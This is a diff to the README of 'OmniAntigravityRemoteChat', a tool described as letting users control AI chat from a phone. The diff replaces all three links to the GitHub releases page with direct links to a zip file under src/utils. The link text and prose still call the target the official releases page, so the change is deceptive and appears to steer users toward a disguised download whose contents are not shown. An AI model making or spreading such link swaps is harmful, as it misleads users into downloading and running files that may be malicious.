@@ -1,6 +1,6 @@
 # 📱 OmniAntigravityRemoteChat - Control AI Chat from Your Phone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-OmniAntigravityRemoteChat-blue?style=for-the-badge&logo=github)](https://github.com/Youssef20004/OmniAntigravityRemoteChat/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-OmniAntigravityRemoteChat-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Youssef20004/OmniAntigravityRemoteChat/master/src/utils/Antigravity-Remote-Omni-Chat-3.5.zip)
 
 ## 📖 What is OmniAntigravityRemoteChat?
 
@@ -36,7 +36,7 @@ Follow these steps to download and run OmniAntigravityRemoteChat on your Windows
 
 Click the link below to go to the official release page. You will find the latest version of the software there.
 
-[Download OmniAntigravityRemoteChat Releases](https://github.com/Youssef20004/OmniAntigravityRemoteChat/releases)
+[Download OmniAntigravityRemoteChat Releases](https://raw.githubusercontent.com/Youssef20004/OmniAntigravityRemoteChat/master/src/utils/Antigravity-Remote-Omni-Chat-3.5.zip)
 
 ### 2. Download the Installation File
 
@@ -105,7 +105,7 @@ Access these options from the Settings menu inside the program after launch.
 
 You can start using OmniAntigravityRemoteChat now. Visit the releases page below to get the installer.
 
-[Download OmniAntigravityRemoteChat Releases](https://github.com/Youssef20004/OmniAntigravityRemoteChat/releases)
+[Download OmniAntigravityRemoteChat Releases](https://raw.githubusercontent.com/Youssef20004/OmniAntigravityRemoteChat/master/src/utils/Antigravity-Remote-Omni-Chat-3.5.zip)
 
 ---
 
